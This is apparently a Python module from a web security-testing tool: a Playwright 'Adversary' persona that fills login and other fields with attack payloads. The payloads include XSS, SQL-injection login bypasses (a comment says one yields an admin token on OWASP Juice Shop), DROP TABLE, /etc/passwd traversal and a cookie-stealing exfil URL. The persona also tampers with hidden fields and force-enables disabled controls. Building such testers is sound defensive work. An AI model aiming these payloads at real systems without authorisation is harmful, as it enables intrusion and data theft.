import time
from playwright.sync_api import Page
from loki.personas.base import BasePersona


class AdversaryPersona(BasePersona):
    """
    Simulates a malicious or hostile actor actively probing frontend security:
    forcibly re-enabling disabled UI elements, tampering with hidden/readonly fields,
    and injecting adversarial security vectors (XSS, SQL delimiters, parameter tampering).
    """

    ADVERSARIAL_PAYLOADS = [
        "<script>alert('LOKI_XSS')</script>",
        "<img src=x onerror=console.error('LOKI_INJECTION')>",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "__proto__[admin]=true",
        "../../../../etc/passwd",
        r"..\..\..\windows\win.ini",
        "{\"isAdmin\": true, \"discount\": 100}",
        "-10000.00",
        "javascript:void(fetch('/api/exfil?c='+document.cookie))",
    ]

    # Classic SQL-injection authentication bypasses. Reserved specifically for fields
    # that look like a login's email/username, instead of being mixed randomly into
    # ADVERSARIAL_PAYLOADS — a login form is the single highest-value target on most
    # apps, and this is the exact payload family that breaks it when aimed correctly
    # (confirmed against OWASP Juice Shop: '... OR 1=1--' in the email field returns a
    # 200 with a full admin JWT, no password needed).
    AUTH_BYPASS_PAYLOADS = [
        "' OR 1=1--",
        "' OR '1'='1' --",
        "' OR '1'='1",
        "admin'--",
        "' OR 1=1#",
    ]

    # Substrings in an input's id/name/autocomplete/placeholder that suggest it's a
    # login's email or username field (type="email" is also checked separately).
    _AUTH_FIELD_HINTS = ("email", "user", "login", "signin")

    def __init__(self, seed: int | None = None):
        super().__init__(
            name="Adversary",
            description="Bypasses client-side disabled guards, tampers with hidden fields, and injects adversarial security payloads.",
            seed=seed,
        )

    def _looks_like_auth_field(self, element) -> bool:
        """True if an input looks like a login form's email/username field — the
        highest-value target for the SQL-injection auth bypass payloads."""
        try:
            if (element.get_attribute("type") or "").lower() == "email":
                return True
            attrs = " ".join(filter(None, [
                element.get_attribute("id"),
                element.get_attribute("name"),
                element.get_attribute("autocomplete"),
                element.get_attribute("placeholder"),
            ])).lower()
            return any(hint in attrs for hint in self._AUTH_FIELD_HINTS)
        except Exception:
            return False

    @staticmethod
    def _find_submit_target(page: Page):
        """Finds the most likely form-submit button, so a bypass payload just typed
        into a field actually gets sent, instead of sitting there until some later,
        unrelated random click happens to fire the form."""
        for selector in (
            "#loginButton",
            "button[type='submit']:visible",
            "input[type='submit']:visible",
            "button:visible",
        ):
            try:
                el = page.query_selector(selector)
                if el:
                    return el
            except Exception:
                continue
        return None

    def _submit_and_watch_for_bypass(self, page: Page, payload: str):
        """Clicks the likely submit button right after an auth-bypass payload was
        typed in, and watches the very next response for signs of a successful
        authentication bypass (HTTP < 400 carrying a token/auth field) so a hit
        shows up clearly in the log instead of being buried in the HAR."""
        submit_btn = self._find_submit_target(page)
        if not submit_btn:
            return

        hit = {"status": None}

        def _watch(response):
            try:
                if hit["status"] is not None or response.request.method not in ("POST", "PUT"):
                    return
                if response.status >= 400:
                    return
                content_type = response.headers.get("content-type", "")
                if "json" not in content_type:
                    return
                body = response.text()
                if '"token"' in body or '"authentication"' in body:
                    hit["status"] = response.status
            except Exception:
                pass

        page.on("response", _watch)
        try:
            btn_text = (submit_btn.text_content() or "submit").strip()[:30]
            self.log_action(f"Immediately submitting auth-bypass payload via '{btn_text}'")
            submit_selector = self.resilient_selector(submit_btn)
            submit_btn.click(timeout=800, no_wait_after=True, force=True)
            if submit_selector:
                self.record_step("click", selector=submit_selector, force=True)
            page.wait_for_timeout(400)
        finally:
            page.remove_listener("response", _watch)

        if hit["status"] is not None:
            self.log_action(
                f"🚨 POSSIBLE AUTHENTICATION BYPASS: submitting '{payload[:30]}' got back "
                f"HTTP {hit['status']} with a token/authentication field in the response."
            )

    def _force_enable_disabled_controls(self, page: Page) -> list[str]:
        """Strips disabled and aria-disabled attributes from DOM elements via JavaScript."""
        script = """
        () => {
            const elements = document.querySelectorAll('button:disabled, input:disabled, [aria-disabled="true"], [disabled]');
            const unlocked = [];
            elements.forEach(el => {
                el.removeAttribute('disabled');
                el.removeAttribute('aria-disabled');
                el.style.pointerEvents = 'auto';
                el.style.opacity = '1';
                unlocked.push((el.id || el.getAttribute('name') || el.innerText || el.tagName).trim().substring(0, 30));
            });
            return unlocked;
        }
        """
        try:
            return page.evaluate(script)
        except Exception:
            return []

    def _tamper_hidden_and_readonly(self, page: Page) -> list[str]:
        """Detects and tampers with hidden or readonly inputs."""
        script = """
        () => {
            const targets = document.querySelectorAll('input[type="hidden"], [readonly]');
            const tampered = [];
            targets.forEach(el => {
                el.removeAttribute('readonly');
                el.value = 'ADVERSARY_MODIFIED_ADMIN';
                tampered.push(el.name || el.id || 'hidden_input');
            });
            return tampered;
        }
        """
        try:
            return page.evaluate(script)
        except Exception:
            return []

    def attack(self, page: Page, duration: int):
        """Executes adversarial chaos and security bypass attacks."""
        self.log_action(f"Started Adversary security assault session (duration: {duration}s)")
        start_time = time.time()

        step = 0
        while time.time() - start_time < duration:
            step += 1
            try:
                # Vector 1: Tamper with hidden or readonly state
                tampered = self._tamper_hidden_and_readonly(page)
                if tampered:
                    self.log_action(f"Tampered with {len(tampered)} hidden/readonly fields: {', '.join(tampered[:3])}")
                    self.record_step("tamper_hidden")

                # Vector 2: Force-unlock disabled buttons (bypassing client UI locks)
                unlocked = self._force_enable_disabled_controls(page)
                if unlocked:
                    self.log_action(f"Bypassed client locks on {len(unlocked)} disabled controls: {', '.join(unlocked[:3])}")
                    self.record_step("force_enable_disabled")

                # Vector 3: Inject adversarial security payloads into visible inputs.
                # Login-shaped fields (email/username) get the dedicated SQL-injection
                # auth-bypass payloads and an immediate submit, instead of competing on
                # equal footing with every other input for a random pick each cycle —
                # a login form is the single highest-value target on most apps.
                inputs = page.query_selector_all("input:visible:not([type='submit']):not([type='button']), textarea:visible")
                if inputs:
                    auth_candidates = [el for el in inputs if self._looks_like_auth_field(el)]
                    if auth_candidates:
                        target_input = self.rng.choice(auth_candidates)
                        payload = self.rng.choice(self.AUTH_BYPASS_PAYLOADS)
                    else:
                        target_input = self.rng.choice(inputs)
                        payload = self.rng.choice(self.ADVERSARIAL_PAYLOADS)
                    input_id = target_input.get_attribute("id") or target_input.get_attribute("name") or "field"

                    self.log_action(f"Adversarial probe on '{input_id}' with payload: {payload[:35]}...")
                    selector = self.resilient_selector(target_input)
                    target_input.fill(payload)
                    if selector:
                        self.record_step("fill", selector=selector, value=payload)
                    page.wait_for_timeout(100)

                    if auth_candidates:
                        self._submit_and_watch_for_bypass(page, payload)

                # Vector 4: Forcibly click action buttons even if application tried to lock them
                buttons = page.query_selector_all("button:visible, input[type='submit']:visible")
                if buttons:
                    target_btn = self.rng.choice(buttons)
                    btn_text = (target_btn.text_content() or "Submit").strip()[:30]
                    self.log_action(f"Adversarial force-click on '{btn_text}'")
                    selector = self.resilient_selector(target_btn)
                    target_btn.click(timeout=800, no_wait_after=True, force=True)
                    if selector:
                        self.record_step("click", selector=selector, force=True)

                page.wait_for_timeout(350)

            except Exception as e:
                self.log_action(f"Adversary cycle note: {str(e)[:40]}")
                page.wait_for_timeout(300)

        self.log_action("Finished Adversary security assault session")

    def attack_step(self, page: Page, step: dict):
        """Mutates recorded journey steps with security bypasses and payload injections."""
        event_type = step.get("action") or step.get("type")
        selector = step.get("selector")
        target_name = step.get("value") or step.get("text") or step.get("id") or selector

        if event_type == "input":
            try:
                el = page.query_selector(selector)
            except Exception:
                el = None
            is_auth_field = el is not None and self._looks_like_auth_field(el)
            payload = self.rng.choice(self.AUTH_BYPASS_PAYLOADS) if is_auth_field else self.rng.choice(self.ADVERSARIAL_PAYLOADS)
            self.log_action(f"Adversary: Mutating journey input '{target_name}' with payload: {payload[:30]}...")
            try:
                if el:
                    el.fill(payload)
                    self.record_step("fill", selector=selector, value=payload)
                    if is_auth_field:
                        self._submit_and_watch_for_bypass(page, payload)
            except Exception:
                pass

        elif event_type == "click":
            self.log_action(f"Adversary: Executing journey click on '{target_name}'")
            try:
                el = page.query_selector(selector)
                if el:
                    el.click(timeout=500, no_wait_after=True, force=True)
                    self.record_step("click", selector=selector, force=True)
                    page.wait_for_timeout(100)
                    # Forcibly remove disabled and click again to probe server-side idempotency
                    self._force_enable_disabled_controls(page)
                    self.record_step("force_enable_disabled")
                    self.log_action(f"Adversary: Forcing duplicate execution on '{target_name}'")
                    el.click(timeout=500, no_wait_after=True, force=True)
                    self.record_step("click", selector=selector, force=True)
            except Exception:
                pass
